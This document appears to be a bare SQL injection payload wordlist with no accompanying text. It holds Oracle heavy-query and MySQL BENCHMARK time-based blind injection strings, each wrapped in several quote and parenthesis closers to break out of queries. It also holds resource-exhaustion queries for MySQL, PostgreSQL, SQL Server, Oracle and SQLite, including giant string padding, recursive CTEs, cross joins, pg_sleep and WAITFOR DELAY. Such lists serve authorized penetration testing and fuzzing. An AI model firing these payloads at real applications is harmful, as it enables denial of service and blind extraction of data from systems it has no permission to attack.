')+AND+2222=(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)+AND+600>(1)+AND+('0rd'='0rd
')+AND+2222=(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)+AND+600>(700)+AND+('0rd'='0rd
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
SELECT BENCHMARK(100000000, MD5(1));
SELECT LENGTH(REPEAT('A', 1000000000));
SELECT * FROM users ORDER BY RAND();
SELECT JSON_EXTRACT(REPEAT('{"key": "value"}', 1000000), '$.key');
SELECT (SELECT COUNT(*) FROM users);
WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t WHERE n < 1000000) SELECT * FROM t;
SELECT COUNT(*), pg_sleep(10) FROM generate_series(1, 100000000);
SELECT LENGTH(RPAD('', 10000000, 'A'));
SELECT * FROM generate_series(1, 1000000000) ORDER BY random();
SELECT a.*, b.* FROM users a CROSS JOIN users b;
SELECT POWER(10, 10), WAITFOR DELAY '00:00:05';
WITH RECURSIVE cte AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM cte WHERE n < 1000000) SELECT * FROM cte;
SELECT LEN(REPLICATE('A', 1000000000));
SELECT EXTRACTVALUE(XMLType('<?xml version="1.0"?><root>' || RPAD('A', 1000000000, 'A') || '</root>'), '/root/text()') FROM dual;
SELECT LENGTH(RPAD('A', 1000000000, 'A')) FROM dual;
WITH RECURSIVE t(n) AS (SELECT 1 FROM dual UNION ALL SELECT n + 1 FROM t WHERE n < 1000000) SELECT * FROM t;
SELECT (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2, sqlite_master AS t3);
WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM cnt WHERE x < 1000000) SELECT COUNT(*) FROM cnt;
SELECT LENGTH(REPLACE(HEX(RANDOMBLOB(1000000)), '00', ''));
SELECT a.*, b.* FROM users a, passwords b;
SELECT * FROM users a CROSS JOIN orders b;
